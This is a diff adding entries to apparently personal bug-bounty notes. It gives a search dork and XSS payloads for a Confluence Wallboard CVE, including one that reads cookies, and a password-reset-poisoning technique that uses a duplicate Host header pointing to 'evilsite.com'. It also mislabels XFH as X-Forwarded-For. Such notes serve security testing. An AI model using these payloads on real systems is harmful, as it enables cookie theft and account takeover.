@@ -37,3 +37,51 @@ Resource -> https://community.atlassian.com/t5/Jira-Questions/JQL-input-sanitiza
 
 
 3. 
+Testing for confluence(Older version)
+Found CVE:-2018-20824
+
+Created dork: inurl:"/plugins/servlet/Wallboard/"
+
+EP:/?dashboardId=10102&dashboardId=10103&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=fadeZoom&random=false
+
+Resource ->
+https://www.cybersecurity-help.cz/vdb/SB2019050605
+
+Some programs still using old versions: Hit and try
+
+/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
+
+
+4.
+I was testing for ATO via reset function . Tried all method but no success. My friend 
+@Tabnexa
+  gave me tip to add  double Host in request while requesting password
+
+Host: http://site.com
+Host: http://evilsite.com
+
+Boom it worked 
+
+Resource ->
+https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection
+
+Read this and there are multiple bypasses on h1 .
+
+What did you achieved by add double host? -> Password Reset Poisoning
+
+What are the other things we can try??
+
+I tried this method, permuting email and token, adding extra email, X-Forwarded Headers, X-Host header,  HPP... What else can we do???
+
+Host,   X F H ,Vice versa of them....
+
+ATO -> Account Takeover
+XFH -> X-Forwarded-For
+
+Resource ->
+https://www.youtube.com/watch?v=HgCLbeUegfI&feature=youtu.be
+
+
+
+
+
